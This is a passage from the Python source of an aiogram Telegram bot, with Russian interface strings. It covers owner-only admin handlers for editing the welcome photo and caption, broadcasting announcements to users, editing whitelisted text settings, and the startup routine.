        "✅ <b>Фото приветствия обновлено!</b>\n\nПроверь через /start.",
        reply_markup=await admin_kb()
    )


@router.message(AdminStates.waiting_start_photo)
async def adm_photo_wrong(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    await message.answer("❌ Это не фото. Отправь картинку или /cancel.")


@router.callback_query(F.data == "adm:photo_caption")
async def adm_photo_caption(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Нет прав", show_alert=True)
        return
    await state.set_state(AdminStates.waiting_start_caption)
    current = await get_start_caption()
    await cb.message.answer(
        f"✏️ <b>Текущая подпись:</b>\n\n{current}\n\n"
        f"Отправь новый текст подписи (HTML разрешён):\n\n"
        f"<i>/cancel — отмена</i>"
    )
    await cb.answer()


@router.message(AdminStates.waiting_start_caption)
async def adm_caption_save(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return
    text = message.html_text or message.text or ""
    if not text.strip():
        await message.answer("❌ Пустой текст. Попробуй снова.")
        return
    await set_setting("start_caption", text)
    await state.clear()
    await message.answer(
        "✅ <b>Подпись обновлена!</b>\n\nПроверь через /start.",
        reply_markup=await admin_kb()
    )


@router.callback_query(F.data == "adm:photo_delete")
async def adm_photo_delete(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Нет прав", show_alert=True)
        return
    await set_setting("start_photo", "")
    await cb.message.edit_text(
        "🗑 <b>Фото удалено.</b>\n\nТеперь приветствие отправляется текстом.",
        reply_markup=await admin_kb()
    )
    await cb.answer("Удалено")


@router.callback_query(F.data == "adm:back")
async def adm_back(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Нет прав", show_alert=True)
        return
    await state.clear()
    active = await is_bot_active()
    await cb.message.edit_text(
        f"⚙️ <b>Админ-панель</b>\n\n"
        f"Статус бота: <b>{'▶️ активен' if active else '⏸ остановлен'}</b>\n\n"
        f"Выбери действие 👇",
        reply_markup=await admin_kb()
    )
    await cb.answer()


# ==================== РАССЫЛКА / ИЗМЕНЕНИЕ НАСТРОЕК ====================
@router.message(AdminStates.waiting_broadcast)
async def admin_broadcast(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return
    text = message.text or ""
    sent, failed = 0, 0
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id FROM users") as cur:
            users = [r[0] for r in await cur.fetchall()]
    for uid in users:
        if await safe_send_user(uid, f"📢 <b>Объявление</b>\n\n{text}"):
            sent += 1
        else:
            failed += 1
        await asyncio.sleep(0.05)
    await message.answer(f"✅ Отправлено: <b>{sent}</b>\n❌ Ошибок: <b>{failed}</b>")
    await state.clear()


@router.message(AdminStates.waiting_btn_text)
async def admin_edit_setting(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return
    text = message.text or ""
    if "=" not in text:
        await message.answer("❌ Формат: <code>ключ=значение</code>")
        return
    key, val = text.split("=", 1)
    key, val = key.strip(), val.strip()
    allowed = {
        "btn_banana", "btn_profile", "btn_support", "btn_withdraw",
        "text_support", "text_phone_prompt", "text_code_prompt"
    }
    if key not in allowed:
        await message.answer(f"❌ Неизвестный ключ. Допустимые: {', '.join(allowed)}")
        return
    await set_setting(key, val)
    await message.answer(f"✅ Сохранено:\n<code>{key}</code> → {val}", reply_markup=await admin_kb())
    await state.clear()


# ==================== ЗАПУСК ====================
async def main():
    await db_init()
    await bot.set_my_commands([
        BotCommand(command="start", description="🏠 Главное меню"),
        BotCommand(command="cancel", description="❌ Отменить действие"),
    ])
    log.info(f"🤖 Запуск. OWNER_ID={OWNER_ID}, GROUP_ID={GROUP_ID}, CHANNEL={CHANNEL_ID}")
    await check_group_access()
    await check_channel_access()
    log.info("✅ Бот запущен, polling стартует")
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Бот остановлен")
